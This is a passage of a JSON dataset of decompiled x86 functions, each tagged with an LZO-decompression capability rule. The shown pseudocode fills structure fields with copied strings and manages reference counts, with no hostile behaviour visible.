puStack112 = 0x4949e4;\n    (**(*var_ch + 0x14))();\n    piStack120 = var_2ch_2 + 1;\n    var_3ch_2 = var_2ch_2;\n    if (piStack120 < 0x3fffffff) {\n        puStack112 = piStack120 * 2;\n        puStack116 = 0x494a0a;\n        var_40h = puStack112;\n        iVar6 = fcn.004c2c50();\n        piStack104 = NULL;\n        piStack108 = var_3ch_2;\n        puStack116 = 0x494a26;\n        puStack112 = iVar6;\n        fcn.00455930();\n        *(noname_2 + 0x14) = iVar6;\n        *(noname_2 + 0x18) = var_3ch_2;\n        *(iVar6 + -2 + var_40h) = 0;\n        if (var_30h_2 != &fcn.00494940::var_28h_2) {\n            piStack124 = var_30h_2;\n            iStack128 = 0x494a4e;\n            fcn.004c2c30();\n        }\n        piStack124 = var_ch;\n        iStack128 = 0x494a59;\n        (**(*var_ch + 0x18))();\n        var_ch = var_2ch_2 + 1;\n        piStack120 = var_2ch_2;\n        if (var_ch < 0x3fffffff) {\n            puStack116 = 0x494a74;\n            puStack112 = var_ch * 2;\n            puStack112 = fcn.004c2c50();\n            piStack104 = NULL;\n            piStack108 = var_2ch_2;\n            puStack116 = 0x494a8e;\n            var_3ch_2 = puStack112;\n            fcn.00455930();\n            *(noname_2 + 0x20) = var_2ch_2;\n            *(var_3ch_2 + -2 + var_ch * 2) = 0;\n            *(noname_2 + 0x1c) = var_3ch_2;\n            if (var_30h_2 != &fcn.00494940::var_28h_2) {\n                piStack124 = var_30h_2;\n                iStack128 = 0x494ab3;\n                fcn.004c2c30();\n            }\n            return;\n        }\n    }\n    else {\n        puStack116 = 0x494acc;\n        fcn.004c33a0();\n    }\n    puStack116 = 0x494ad1;\n    fcn.004c33a0();\n    if (var_30h_2 != &fcn.00494940::var_28h_2) {\n        puStack112 = var_30h_2;\n        puStack116 = 0x494ae3;\n        fcn.004c2c30();\n    }\n    puStack112 = noname_2;\n    puStack116 = 0x494aeb;\n    fcn.0043a8e0();\n    iVar3 = iStack100;\n    piVar2 = piStack104;\n    iStack128 = noname_2;\n    piStack124 = var_ch;\n    puStack116 = &stack0xfffffffc;\n    uVar4 = (**(*piStack104 + 8))();\n    *(iVar3 + 0x11) = uVar4;\n    uVar4 = (**(*piVar2 + 0xc))();\n    *(iVar3 + 0x12) = uVar4;\n    uVar7 = (**(*piVar2 + 0x20))();\n    *(iVar3 + 8) = 0;\n    *(iVar3 + 0x2c) = uVar7;\n    *(iVar3 + 0x14) = 0;\n    *(iVar3 + 0x1c) = 0;\n    *(iVar3 + 0x24) = 0;\n    *(iVar3 + 0x43) = 1;\n    (**(*piVar2 + 0x10))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar3 + 0xc) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar3 + 8) = iVar8;\n    if (*0x515a34 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x14))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar3 + 0x18) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar3 + 0x14) = iVar8;\n    if (*0x515a34 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x18))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar3 + 0x20) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    iVar6 = *0x515a34;\n    *(iVar3 + 0x1c) = iVar8;\n    if (iVar6 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x1c))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar9 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar9, iVar6, 0);\n    iVar8 = *0x515a34;\n    *(iVar3 + 0x28) = iVar6;\n    *(iVar9 + iVar6) = 0;\n    *(iVar3 + 0x24) = iVar9;\n    if (iVar8 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff6f);\n    }\n    uVar7 = (**(*piVar2 + 0x24))();\n    *(iVar3 + 0x30) = uVar7;\n    uVar7 = (**(*piVar2 + 0x28))();\n    *(iVar3 + 0x34) = uVar7;\n    return;\n}\n",
        "token_count": 2777
    },
    "00494af0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid fcn.00494af0(uint param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *var_ch;\n    int32_t var_10h;\n    uint var_2ch_2;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch_2;\n    \n    uVar3 = (**(*var_ch + 8))();\n    *(var_10h + 0x11) = uVar3;\n    uVar3 = (**(*var_ch + 0xc))();\n    *(var_10h + 0x12) = uVar3;\n    uVar4 = (**(*var_ch + 0x20))();\n    *(var_10h + 8) = 0;\n    *(var_10h + 0x2c) = uVar4;\n    *(var_10h + 0x14) = 0;\n    *(var_10h + 0x1c) = 0;\n    *(var_10h + 0x24) = 0;\n    *(var_10h + 0x43) = 1;\n    (**(*var_ch + 0x10))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(var_10h + 0xc) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(var_10h + 8) = iVar5;\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*var_ch + 0x14))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(var_10h + 0x18) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(var_10h + 0x14) = iVar5;\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*var_ch + 0x18))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(var_10h + 0x20) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    iVar2 = *0x515a34;\n    *(var_10h + 0x1c) = iVar5;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*var_ch + 0x1c))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar6 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar6, iVar2, 0);\n    iVar5 = *0x515a34;\n    *(var_10h + 0x28) = iVar2;\n    *(iVar6 + iVar2) = 0;\n    *(var_10h + 0x24) = iVar6;\n    if (iVar5 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    uVar4 = (**(*var_ch + 0x24))();\n    *(var_10h + 0x30) = uVar4;\n    uVar4 = (**(*var_ch + 0x28))();\n    *(var_10h + 0x34) = uVar4;\n    return;\n}\n",
        "token_count": 1295
    },
    "00494dd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00494dd0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar2;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x20) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x28) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x24) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    uVar2 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar2;\n    uVar2 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar2;\n    return;\n}\n",
        "token_count": 880
    },
    "00494fd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00494fd0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    uVar3 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar3;\n    uVar3 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar3;\n    uVar4 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar4;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(arg_10h + 0xc) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 8) = iVar5;\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(arg_10h + 0x18) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 0x14) = iVar5;\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    *(arg_10h + 0x20) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    iVar2 = *0x515a34;\n    *(arg_10h + 0x1c) = iVar5;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar6 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar6, iVar2, 0);\n    iVar5 = *0x515a34;\n    *(arg_10h + 0x28) = iVar2;\n    *(iVar6 + iVar2) = 0;\n    *(arg_10h + 0x24) = iVar6;\n    if (iVar5 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    uVar4 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar4;\n    uVar4 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar4;\n    return;\n}\n",
        "token_count": 1275
    },
    "004952b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004952b0(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x11) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x2c) = uVar2;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 0x24) = 0;\n    *(arg_10h + 0x43) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x20) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x1c))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0x28) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 0x24) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    uVar2 = (**(*arg_ch + 0x24))();\n    *(arg_10h + 0x30) = uVar2;\n    uVar2 = (**(*arg_ch + 0x28))();\n    *(arg_10h + 0x34) = uVar2;\n    return;\n}\n",
        "token_count": 880
    },
    "004954b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n\nvoid __cdecl\nfcn.004954b0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint *extraout_ECX;\n    uint32_t uVar8;\n    int32_t *var_ch_2;\n    int32_t var_10h_2;\n    uint var_ch;\n    uint var_10h;\n    uint var_2ch;\n    uint var_1ch;\n    uchar *puStack380;\n    int32_t iStack376;\n    uchar auStack372 [28];\n    int32_t iStack344;\n    int32_t *piStack340;\n    int32_t *piStack336;\n    uchar *puStack332;\n    int32_t iStack328;\n    uchar *puStack324;\n    int32_t *piStack320;\n    int32_t *piStack316;\n    uchar *puStack312;\n    uint uStack304;\n    int32_t iStack300;\n    int32_t *piStack296;\n    uint uStack292;\n    int32_t iStack272;\n    int32_t *piStack268;\n    uchar auStack253 [17];\n    int32_t *piStack236;\n    int32_t *piStack232;\n    uint32_t uStack228;\n    uchar *puStack224;\n    int32_t *piStack220;\n    int32_t *piStack216;\n    int32_t *piStack212;\n    int32_t iStack208;\n    int32_t iStack204;\n    int32_t *piStack200;\n    uint uStack196;\n    int32_t iStack176;\n    int32_t *piStack172;\n    int32_t *piStack160;\n    int32_t *piStack156;\n    int32_t aiStack152 [7];\n    int32_t iStack124;\n    int32_t *piStack120;\n    int32_t *piStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    int32_t iStack92;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t var_30h_2;\n    int32_t *var_2ch_3;\n    uint var_28h_2;\n    uint var_3ch;\n    int32_t var_1ch_3;\n    uint var_30h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_1ch_2;\n    \n    iStack80 = 0x4954c6;\n    uVar1 = (**(*var_ch_2 + 8))();\n    *(var_10h_2 + 0x12) = uVar1;\n    iStack80 = 0x4954d1;\n    uVar1 = (**(*var_ch_2 + 0xc))();\n    *(var_10h_2 + 0x14) = uVar1;\n    iStack80 = 0x4954dc;\n    uVar2 = (**(*var_ch_2 + 0x20))();\n    *(var_10h_2 + 8) = 0;\n    *(var_10h_2 + 0x30) = uVar2;\n    *(var_10h_2 + 0x18) = 0;\n    *(var_10h_2 + 0x20) = 0;\n    *(var_10h_2 + 0x28) = 0;\n    *(var_10h_2 + 0x52) = 1;\n    piStack76 = var_ch_2;\n    iStack80 = 0x49550a;\n    (**(*var_ch_2 + 0x10))();\n    iVar4 = *(var_1ch_3 + -0xc);\n    iStack80 = iVar4 + 1;\n    uStack84 = 0x49551e;\n    iStack80 = fcn.004c2c50();\n    uStack72 = 0;\n    uStack84 = 0x495538;\n    piStack76 = iVar4;\n    var_2ch_3 = iStack80;\n    fcn.0044bff0();\n    *(var_10h_2 + 0xc) = iVar4;\n    *(var_2ch_3 + iVar4) = 0;\n    *(var_10h_2 + 8) = var_2ch_3;\n    if (*0x515a34 == 0) {\n        iVar4 = *(var_1ch_3 + -4);\n        *(var_1ch_3 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_1ch_3 + -4;\n        iVar4 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (iVar4 < 1) {\n        iStack92 = &fcn.004954b0::var_3ch + 3;\n        piStack96 = 0x495740;\n        fcn.0048b610();\n    }\n    piStack96 = var_ch_2;\n    piStack100 = 0x495574;\n    (**(*var_ch_2 + 0x14))();\n    var_2ch_3 = *(var_1ch_3 + -0xc);\n    uVar8 = var_2ch_3 + 1;\n    if (uVar8 < 0x3fffffff) {\n        piStack100 = uVar8 * 2;\n        iStack104 = 0x49559d;\n        var_30h_2 = piStack100;\n        piVar3 = fcn.004c2c50();\n        iStack92 = 0;\n        piStack96 = var_2ch_3;\n        iStack104 = 0x4955b9;\n        piStack100 = piVar3;\n        fcn.0044b110();\n        *(var_10h_2 + 0x18) = piVar3;\n        *(piVar3 + var_30h_2 + -2) = 0;\n        *(var_10h_2 + 0x1c) = var_2ch_3;\n        if (*0x515a34 == 0) {\n            iVar4 = *(var_1ch_3 + -4);\n            *(var_1ch_3 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch_3 + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack112 = &fcn.004954b0::var_3ch + 3;\n            piStack116 = 0x495770;\n            fcn.00483750();\n        }\n        piStack116 = var_ch_2;\n        piStack120 = 0x4955fb;\n        (**(*var_ch_2 + 0x18))();\n        var_2ch_3 = *(var_1ch_3 + -0xc);\n        uVar8 = var_2ch_3 + 1;\n        if (0x3ffffffe < uVar8) goto code_r0x004957ff;\n        iStack108 = 0x495620;\n        iStack104 = uVar8 * 2;\n        iStack104 = fcn.004c2c50();\n        piStack96 = NULL;\n        piStack100 = var_2ch_3;\n        iStack108 = 0x49563f;\n        var_30h_2 = iStack104;\n        fcn.0044b110();\n        *(var_30h_2 + -2 + uVar8 * 2) = 0;\n        iVar4 = *0x515a34;\n        *(var_10h_2 + 0x20) = var_30h_2;\n        *(var_10h_2 + 0x24) = var_2ch_3;\n        if (iVar4 == 0) {\n            iVar4 = *(var_1ch_3 + -4);\n            *(var_1ch_3 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch_3 + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack116 = &fcn.004954b0::var_3ch + 3;\n            piStack120 = 0x4957a0;\n            fcn.00483750();\n        }\n        piStack120 = var_ch_2;\n        iStack124 = 0x495681;\n        (**(*var_ch_2 + 0x1c))();\n        var_2ch_3 = *(var_1ch_3 + -0xc);\n        uVar8 = var_2ch_3 + 1;\n        if (uVar8 < 0x3fffffff) {\n            iStack104 = uVar8 * 2;\n            iStack108 = 0x4956aa;\n            var_30h_2 = iStack104;\n            iVar4 = fcn.004c2c50();\n            piStack96 = NULL;\n            piStack100 = var_2ch_3;\n            iStack108 = 0x4956c6;\n            iStack104 = iVar4;\n            fcn.0044b110();\n            *(var_10h_2 + 0x28) = iVar4;\n            *(iVar4 + -2 + var_30h_2) = 0;\n            iVar4 = *0x515a34;\n            *(var_10h_2 + 0x2c) = var_2ch_3;\n            if (iVar4 == 0) {\n                iVar4 = *(var_1ch_3 + -4);\n                *(var_1ch_3 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar3 = var_1ch_3 + -4;\n                iVar4 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack116 = &fcn.004954b0::var_3ch + 3;\n                piStack120 = 0x4957d0;\n                fcn.00483750();\n            }\n            iStack124 = 0x495705;\n            uVar2 = (**(*var_ch_2 + 0x24))();\n            *(var_10h_2 + 0x34) = uVar2;\n            iStack124 = 0x49570f;\n            uVar2 = (**(*var_ch_2 + 0x28))();\n            *(var_10h_2 + 0x38) = uVar2;\n            return;\n        }\n        iStack108 = 0x495811;\n        fcn.004c33a0();\n    }\n    else {\n        iStack104 = 0x4957e5;\n        fcn.004c33a0();\n        piStack100 = &fcn.004954b0::var_3ch + 3;\n        iStack104 = 0x4957f6;\n        fcn.0048b630();\n        iStack104 = var_10h_2;\n        iStack108 = 0x4957ff;\n        fcn.0043a8e0();\ncode_r0x004957ff:\n        iStack108 = 0x495804;\n        var_10h_2 = fcn.004c33a0();\n    }\n    iStack104 = &fcn.004954b0::var_3ch + 3;\n    iStack108 = 0x495822;\n    fcn.00483770();\n    puStack112 = 0x49582b;\n    iStack108 = var_10h_2;\n    fcn.0043a8e0();\n    piVar5 = piStack96;\n    piVar6 = piStack100;\n    piStack120 = var_ch_2;\n    iStack204 = 0x495846;\n    iStack124 = var_10h_2;\n    piStack116 = uVar8;\n    puStack112 = &fcn.004954b0::var_1ch_2;\n    uVar1 = (**(*piStack100 + 8))();\n    *(piVar5 + 0x12) = uVar1;\n    iStack204 = 0x495851;\n    uVar1 = (**(*piVar6 + 0xc))();\n    *(piVar5 + 5) = uVar1;\n    iStack204 = 0x49585c;\n    iVar4 = (**(*piVar6 + 0x20))();\n    piVar5[2] = 0;\n    piVar5[0xc] = iVar4;\n    piVar5[6] = 0;\n    piVar5[8] = 0;\n    piVar5[10] = 0;\n    *(piVar5 + 0x52) = 1;\n    piStack200 = piVar6;\n    iStack204 = 0x49588a;\n    (**(*piVar6 + 0x10))();\n    piVar3 = piStack156;\n    iStack204 = piStack156 + 1;\n    iStack208 = 0x49589b;\n    iStack204 = fcn.004c2c50();\n    uStack196 = 0;\n    piStack200 = piVar3;\n    iStack208 = 0x4958b5;\n    piStack172 = iStack204;\n    fcn.00454b80();\n    piVar5[3] = piVar3;\n    *(piStack172 + piVar3) = 0;\n    piVar5[2] = piStack172;\n    if (piStack160 != &stack0xffffff68) {\n        piStack216 = piStack160;\n        piStack220 = 0x4958d7;\n        fcn.004c2c30();\n    }\n    piStack216 = piVar6;\n    piStack220 = 0x4958e2;\n    (**(*piVar6 + 0x14))();\n    uStack228 = piStack156 + 1;\n    piStack172 = piStack156;\n    if (uStack228 < 0x3fffffff) {\n        piStack220 = uStack228 * 2;\n        puStack224 = 0x495908;\n        iStack176 = piStack220;\n        iVar4 = fcn.004c2c50();\n        piStack212 = NULL;\n        piStack216 = piStack172;\n        puStack224 = 0x495924;\n        piStack220 = iVar4;\n        fcn.00455930();\n        piVar5[6] = iVar4;\n        piVar5[7] = piStack172;\n        *(iVar4 + -2 + iStack176) = 0;\n        if (piStack160 != &stack0xffffff68) {\n            piStack232 = piStack160;\n            piStack236 = 0x49594c;\n            fcn.004c2c30();\n        }\n        piStack232 = piVar6;\n        piStack236 = 0x495957;\n        (**(*piVar6 + 0x18))();\n        uStack228 = piStack156 + 1;\n        piStack172 = piStack156;\n        if (0x3ffffffe < uStack228) goto code_r0x00495a67;\n        puStack224 = 0x495979;\n        piStack220 = uStack228 * 2;\n        piStack220 = fcn.004c2c50();\n        piStack212 = NULL;\n        piStack216 = piStack172;\n        puStack224 = 0x495998;\n        iStack176 = piStack220;\n        fcn.00455930();\n        *(iStack176 + 